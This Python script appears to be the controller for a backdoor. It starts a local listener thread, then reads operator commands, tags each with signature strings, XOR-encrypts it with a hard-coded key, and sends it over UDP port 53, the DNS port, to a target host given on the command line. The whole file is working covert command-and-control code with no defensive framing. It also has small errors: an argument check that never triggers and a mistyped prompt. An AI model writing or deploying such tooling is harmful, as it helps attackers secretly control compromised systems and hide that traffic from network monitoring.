
import sys
import socket
import threading
from itertools import cycle

from server import runServer


if len(sys.argv) < 1:
    print("Usage: to less arguments")
    sys.exit()

serverThread = threading.Thread(target = runServer, args = ("127.0.0.1", 5000))
serverThread.start()

PORT = 53
HOST = sys.argv[1]

SIGNATURE_ONE = "cr49s"
SIGNATURE_TWO = "32pld"
KEY = "@DNJI(HSNA872w"

while True:
    command = input("/n>").strip().lower()
    if not command:
        continue

    encryptedCommand = ''.join(chr(ord(c) ^ ord(k)) for c, k in zip(SIGNATURE_TWO + command, cycle(KEY)))
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        payload = (SIGNATURE_ONE + encryptedCommand).encode()
        s.sendto(payload, (HOST, PORT))

